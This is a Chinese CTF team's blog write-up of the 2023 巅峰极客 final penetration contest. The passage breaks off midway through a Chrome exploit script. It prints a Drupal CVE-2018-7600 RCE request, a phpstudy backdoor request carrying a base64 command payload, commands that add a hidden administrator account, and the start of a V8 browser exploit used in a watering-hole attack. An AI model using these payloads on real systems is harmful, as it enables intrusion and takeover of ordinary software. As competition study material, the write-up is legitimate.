@@ -1,0 +1,268 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2023 巅峰极客决赛 SU WriteUp -</title><meta name=description content="本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/dfjkfinal-2023-su-wu\/","name":"2023 巅峰极客决赛 su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2023 巅峰极客决赛  SU WriteUp","description":"本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com\n以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。\n","inLanguage":"en","wordCount":649,"datePublished":"2023-08-24T14:02:00\u002b00:00","dateModified":"2023-08-24T14:02:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["渗透"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/dfjkfinal-2023-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2023 巅峰极客决赛  SU WriteUp"><meta property="og:description" content="本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/dfjkfinal-2023-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2023 巅峰极客决赛  SU WriteUp"><meta name=twitter:description content="本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
+<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
+<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2023 巅峰极客决赛 SU WriteUp</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 24, 24080
+&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;4&nbsp;min
+&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;649&nbsp;words
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#赛制描述>赛制描述</a><ul><li><a href=#网络拓扑>网络拓扑</a></li><li><a href=#1招聘网站17320194>1、招聘网站173.20.1.94</a></li><li><a href=#2门户网站-17320153>2、门户网站 173.20.1.53</a></li><li><a href=#3办公电脑-151007010>3、办公电脑 15.100.70.10</a></li><li><a href=#4智慧水利服务-1510070100>4、智慧水利服务 15.100.70.100</a></li><li><a href=#5工程师站1921682100>5、工程师站192.168.2.100</a></li><li><a href=#6操作员站1921682210>6、操作员站192.168.2.210</a></li><li><a href=#7工控-1921682200>7、工控 192.168.2.200</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次巅峰极客决赛为线下渗透赛，我们 SU 取得了 2nd🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>以下是我们 SU 本次 巅峰极客 2023 决赛的 writeup。</p><h2 id=赛制描述>赛制描述</h2><p>本次比赛一共8小时，上午10点到下午6点，多层网络渗透赛，其中包含了一些工控的点，工控和渗透比重五五开，不过大多都是打渗透拿分。比赛中不允许选手联网，但是有联网区4根网线可以上网下资料，由于赛中不需要交wp，本wp是感觉回忆描述而来，如有偏差，多多包涵。</p><h3 id=网络拓扑>网络拓扑</h3><p>本次比赛没有提供网络拓扑，需要自己攻击一步步推理，但是比赛的中途给了一个题目“比赛中可以根据大屏幕上的拓扑图推测逻辑”，但是屏幕又远又花，而且图很抽象。
+<img src=/img/2023-08-24-DFJKfinal/1.jpg alt></p><p>所以根据实际情况我们画了一张自己感觉上的图(事后根据回忆画的，有些差异)
+<img src=/img/2023-08-24-DFJKfinal/2.png alt></p><h3 id=1招聘网站17320194>1、招聘网站173.20.1.94</h3><p>因为开场题目只给了这个ip，所以大家都在打这个，这个招聘网站是直接打的drupal远程代码执行 (CVE-2018-7600),在vulhub上有直接的exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
+</span></span><span class=line><span class=cl>Host: your-ip:8080
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>Accept-Language: en
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Content-Length: 103
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id
+</span></span></code></pre></td></tr></table></div></div><p>拿下后，本来想尝试拿这台服务器搭建代理，或者提权等，大概过了1小时，发了公告1、招聘网站只是一个签到，不需要深入利用，然后开始扫描173.20.1.x/24</p><h3 id=2门户网站-17320153>2、门户网站 173.20.1.53</h3><p>这就很奇怪了，主办方没给公告之前扫了很多次没东西，发了公告后直接扫描到了这个网站，而且给了phpinfo，phpinfo提供了php版本是 5.4.45,存在phpstudy的后门漏洞，poc直接打。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET / HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 127.0.0.1
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Encoding:gzip,deflate
+</span></span><span class=line><span class=cl>Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Cache-Control: max-age=0
+</span></span><span class=line><span class=cl>Content-Length: 2
+</span></span></code></pre></td></tr></table></div></div><p>这个是windows写马挺怪的，花了一些时间上去，发现是高权限用户，命令执行增加用户</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>net user dddd123 dddqwe@!@# /add
+</span></span><span class=line><span class=cl>net localgroup administrators dddd123 /add 
+</span></span></code></pre></td></tr></table></div></div><p>然后使用猕猴桃可以抓admin到密码，同时存在wireshark软件</p><h3 id=3办公电脑-151007010>3、办公电脑 15.100.70.10</h3><p>主办方多次暗示，这个办公电脑会使用浏览器也访问门户。这题应该是最恶心的一个点。
+因为拿下来门户，可以直接挂黑页水坑攻击，我们在173.20.1.53上挂一个恶意js，让办公电脑访问到rce。
+首先我们使用门户网站上的wireshark软件抓到办公电脑访问的流量，其中看到了头部带有的ua，显示是89.0.4389.114。
+刚好是2021年爆出来的chrome 0day rce版本。</p><p>中途大概就两三个队打了，主办方考虑到大家没啥环境，就给了cs4.2版本。最良心的是把exp也给了，再到最后直接给了word说明文档</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=n>script</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>gc</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=k>for</span> <span class=p>(</span><span class=k>var</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x80000</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>           <span class=k>var</span> <span class=n>a</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayBuffer</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>let</span> <span class=n>shellcode</span> <span class=o>=</span> <span class=p>[</span><span class=err>不告诉你</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmCode</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Uint8Array</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>133</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>127</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>130</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>112</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>131</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>145</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>114</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>109</span><span class=p>,</span> <span class=mi>97</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>138</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>42</span><span class=p>,</span> <span class=mi>11</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmModule</span> <span class=o>=</span> <span class=n>new</span> <span class=n>WebAssembly</span><span class=o>.</span><span class=n>Module</span><span class=p>(</span><span class=n>wasmCode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>wasmInstance</span> <span class=o>=</span> <span class=n>new</span> <span class=n>WebAssembly</span><span class=o>.</span><span class=n>Instance</span><span class=p>(</span><span class=n>wasmModule</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>main</span> <span class=o>=</span> <span class=n>wasmInstance</span><span class=o>.</span><span class=n>exports</span><span class=o>.</span><span class=n>main</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>bf</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>var</span> <span class=n>bfView</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataView</span><span class=p>(</span><span class=n>bf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>fLow</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>bfView</span><span class=o>.</span><span class=n>getUint32</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>fHi</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=p>(</span><span class=n>bfView</span><span class=o>.</span><span class=n>getUint32</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=bp>true</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>i2f</span><span class=p>(</span><span class=n>low</span><span class=p>,</span> <span class=n>hi</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setUint32</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>low</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setUint32</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=n>hi</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>f2big</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>f</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=n>function</span> <span class=n>big2f</span><span class=p>(</span><span class=n>b</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=n>bfView</span><span class=o>.</span><span class=n>setBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>       <span class=k>return</span> <span class=n>bfView</span><span class=o>.</span><span class=n>getFloat64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>   <span class=k>class</span> <span class=n>LeakArrayBuffer</span> <span class=k>extends</span> <span class=n>ArrayBuffer</span> <span class=p>{</span>
